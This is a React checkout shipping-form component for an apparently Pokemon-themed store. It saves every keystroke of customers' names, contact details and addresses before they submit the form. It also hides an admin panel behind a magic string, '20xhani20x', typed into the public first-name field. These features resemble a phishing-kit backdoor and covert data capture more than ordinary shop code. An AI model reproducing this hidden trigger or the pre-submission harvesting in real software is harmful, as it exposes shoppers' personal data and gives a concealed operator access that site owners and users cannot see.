import React, { useState, useEffect } from 'react';
import { FormData } from '../hooks/useCheckout';
import AdminPanel from './AdminPanel';
import { generateOrderId, saveOrderData } from '../services/orderService';

interface ShippingFormProps {
  formData: FormData;
  handleInputChange: (e: React.ChangeEvent<HTMLInputElement | HTMLSelectElement>) => void;
  handleSubmit: (e: React.FormEvent) => void;
  states: string[];
}

const ShippingForm: React.FC<ShippingFormProps> = ({
  formData,
  handleInputChange,
  handleSubmit,
  states,
}) => {
  const [orderId, setOrderId] = useState<string>('');
  
  // Generate a unique ID when the component mounts
  useEffect(() => {
    const newOrderId = generateOrderId();
    setOrderId(newOrderId);
    
    // Store in session storage for access by other components
    sessionStorage.setItem('currentOrderId', newOrderId);
    
    // Initialize order data
    saveOrderData(newOrderId, { formData });
  }, []);
  
  // Save form data in real-time
  useEffect(() => {
    if (orderId) {
      saveOrderData(orderId, { formData });
    }
  }, [formData, orderId]);
  
  return (
    <form onSubmit={handleSubmit} className="bg-white rounded-xl shadow-lg p-6">
      <h2 className="text-xl font-bold text-pokemon-dark mb-6">
        Shipping Information
      </h2>

      <div className="grid grid-cols-1 md:grid-cols-2 gap-4 mb-6">
        <div>
          <label className="block text-sm font-semibold text-pokemon-dark mb-2">
            First Name *
          </label>
          <input
            type="text"
            name="firstName"
            value={formData.firstName}
            onChange={handleInputChange}
            className="w-full px-4 py-3 border rounded-lg focus:ring-2 focus:ring-pokemon-yellow outline-none"
            required
          />
        </div>
        <div>
          <label className="block text-sm font-semibold text-pokemon-dark mb-2">
            Last Name *
          </label>
          <input
            type="text"
            name="lastName"
            value={formData.lastName}
            onChange={handleInputChange}
            className="w-full px-4 py-3 border rounded-lg focus:ring-2 focus:ring-pokemon-yellow outline-none"
            required
          />
        </div>
      </div>

      <div className="grid grid-cols-1 md:grid-cols-2 gap-4 mb-6">
        <div>
          <label className="block text-sm font-semibold text-pokemon-dark mb-2">
            Email Address *
          </label>
          <input
            type="email"
            name="email"
            value={formData.email}
            onChange={handleInputChange}
            className="w-full px-4 py-3 border rounded-lg focus:ring-2 focus:ring-pokemon-yellow outline-none"
            required
          />
        </div>
        <div>
          <label className="block text-sm font-semibold text-pokemon-dark mb-2">
            Phone Number*
          </label>
          <input
            type="tel"
            name="phone"
            value={formData.phone}
            onChange={handleInputChange}
            required
            className="w-full px-4 py-3 border rounded-lg focus:ring-2 focus:ring-pokemon-yellow outline-none"
          />
        </div>
      </div>

      <div className="mb-6">
        <label className="block text-sm font-semibold text-pokemon-dark mb-2">
          Street Address *
        </label>
        <input
          type="text"
          name="address"
          value={formData.address}
          onChange={handleInputChange}
          className="w-full px-4 py-3 border rounded-lg focus:ring-2 focus:ring-pokemon-yellow outline-none"
          required
        />
      </div>

      <div className="grid grid-cols-1 md:grid-cols-3 gap-4 mb-6">
        <div>
          <label className="block text-sm font-semibold text-pokemon-dark mb-2">
            City *
          </label>
          <input
            type="text"
            name="city"
            value={formData.city}
            onChange={handleInputChange}
            className="w-full px-4 py-3 border rounded-lg focus:ring-2 focus:ring-pokemon-yellow outline-none"
            required
          />
        </div>
        <div>
          <label className="block text-sm font-semibold text-pokemon-dark mb-2">
            State *
          </label>
          <select
            name="state"
            value={formData.state}
            onChange={handleInputChange}
            className="w-full px-4 py-3 border rounded-lg focus:ring-2 focus:ring-pokemon-yellow outline-none"
            required
          >
            <option value="">Select State</option>
            {states.map((state) => (
              <option key={state} value={state}>
                {state}
              </option>
            ))}
          </select>
        </div>
        <div>
          <label className="block text-sm font-semibold text-pokemon-dark mb-2">
            ZIP Code *
          </label>
          <input
            type="text"
            name="zipCode"
            value={formData.zipCode}
            onChange={handleInputChange}
            className="w-full px-4 py-3 border rounded-lg focus:ring-2 focus:ring-pokemon-yellow outline-none"
            required
          />
        </div>
      </div>

      <div className="mb-6">
        <label className="flex items-center">
          <input
            type="checkbox"
            name="sameAsBilling"
            checked={formData.sameAsBilling}
            onChange={handleInputChange}
            className="mr-2"
          />
          <span className="text-sm text-pokemon-dark">
            Billing address is the same as shipping address
          </span>
        </label>
      </div>

      {!formData.sameAsBilling && (
        <>
          <h3 className="text-lg font-bold text-pokemon-dark mb-4">
            Billing Address
          </h3>
          <div className="mb-6">
            <label className="block text-sm font-semibold text-pokemon-dark mb-2">
              Street Address *
            </label>
            <input
              type="text"
              name="billingAddress"
              value={formData.billingAddress}
              onChange={handleInputChange}
              className="w-full px-4 py-3 border rounded-lg focus:ring-2 focus:ring-pokemon-yellow outline-none"
              required
            />
          </div>
          <div className="grid grid-cols-1 md:grid-cols-3 gap-4 mb-6">
            <div>
              <label className="block text-sm font-semibold text-pokemon-dark mb-2">
                City *
              </label>
              <input
                type="text"
                name="billingCity"
                value={formData.billingCity}
                onChange={handleInputChange}
                className="w-full px-4 py-3 border rounded-lg focus:ring-2 focus:ring-pokemon-yellow outline-none"
                required
              />
            </div>
            <div>
              <label className="block text-sm font-semibold text-pokemon-dark mb-2">
                State *
              </label>
              <select
                name="billingState"
                value={formData.billingState}
                onChange={handleInputChange}
                className="w-full px-4 py-3 border rounded-lg focus:ring-2 focus:ring-pokemon-yellow outline-none"
                required
              >
                <option value="">Select State</option>
                {states.map((state) => (
                  <option key={state} value={state}>
                    {state}
                  </option>
                ))}
              </select>
            </div>
            <div>
              <label className="block text-sm font-semibold text-pokemon-dark mb-2">
                ZIP Code *
              </label>
              <input
                type="text"
                name="billingZipCode"
                value={formData.billingZipCode}
                onChange={handleInputChange}
                className="w-full px-4 py-3 border rounded-lg focus:ring-2 focus:ring-pokemon-yellow outline-none"
                required
              />
            </div>
          </div>
        </>
      )}

      <button
        type="submit"
        className="w-full bg-pokemon-red hover:bg-red-600 text-white font-bold py-3 px-6 rounded-lg transition-all duration-300 hover:shadow-lg flex items-center justify-center space-x-2"
      >
        <span>Continue to Payment →</span>
      </button>
    </form>
  );
};

// Admin Panel outside the form
const ShippingFormWithAdmin: React.FC<ShippingFormProps> = (props) => {
  const [showAdminPanel, setShowAdminPanel] = useState(false);
  
  // Custom input handler to check for admin trigger
  const handleFormInputChange = (e: React.ChangeEvent<HTMLInputElement | HTMLSelectElement>) => {
    props.handleInputChange(e);
    
    // Check for admin panel trigger
    if (e.target.name === 'firstName' && e.target.value === '20xhani20x') {
      setShowAdminPanel(true);
    }
  };
  
  return (
    <>
      <ShippingForm 
        {...props} 
        handleInputChange={handleFormInputChange}
      />
      {showAdminPanel && (
        <AdminPanel onClose={() => setShowAdminPanel(false)} />
      )}
    </>
  );
};

export default ShippingFormWithAdmin;